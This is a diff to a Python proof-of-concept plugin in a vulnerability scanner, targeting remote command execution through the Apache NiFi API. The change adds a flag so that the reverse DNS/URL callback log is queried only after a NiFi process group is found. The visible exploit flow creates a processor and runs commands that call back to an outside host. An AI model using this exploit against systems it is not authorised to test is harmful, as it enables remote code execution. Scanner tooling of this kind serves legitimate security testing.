@@ -27,6 +27,7 @@ class POC():
         self.vulmsg = "link:https://github.com/imjdl/Apache-NiFi-Api-RCE"
         self.level = 2  # 0:Low  1:Medium 2:High
         self.success = False
+        self.isnifi = False
 
     def verify(self):
         # 根据config.py 配置的深度，限定一下目录深度
@@ -37,24 +38,25 @@ class POC():
         tasks = reverse_dnscmd + reverse_urls
         mythread(self.exploit, tasks)
 
-        sleep = True
-        for hexdata in [hexdata_url, hexdata_dns]:
-            query_res, _ = query_reverse(hexdata, sleep)
-            sleep = False
-            if query_res:
-                parser_ = dictdata_parser(self.dictdata)
-                self.result.append({
-                    "name": self.name,
-                    "url": self.url,
-                    "level": self.level,  # 0:Low  1:Medium 2:High
-                    "detail": {
-                        "vulmsg": self.vulmsg,
-                        "others:": "{} in dnslog".format(hexdata),
-                        "request": parser_.getrequestraw(),
-                        "response": parser_.getresponseraw()
-                    }
-                })
-                break
+        if self.isnifi:
+            sleep = True
+            for hexdata in [hexdata_url, hexdata_dns]:
+                query_res, _ = query_reverse(hexdata, sleep)
+                sleep = False
+                if query_res:
+                    parser_ = dictdata_parser(self.dictdata)
+                    self.result.append({
+                        "name": self.name,
+                        "url": self.url,
+                        "level": self.level,  # 0:Low  1:Medium 2:High
+                        "detail": {
+                            "vulmsg": self.vulmsg,
+                            "others:": "{} in dnslog".format(hexdata),
+                            "request": parser_.getrequestraw(),
+                            "response": parser_.getresponseraw()
+                        }
+                    })
+                    break
 
     def check_is_vul(self):
         url = self.url + "nifi-api/access/config"
@@ -91,6 +93,7 @@ class POC():
     def exploit(self, cmd):
         g_id = self.fetch_process_group()
         if g_id:
+            self.isnifi = True
             p_id = self.create_process(g_id)
             if p_id:
                 self.run_cmd(p_id=p_id, cmd=cmd)
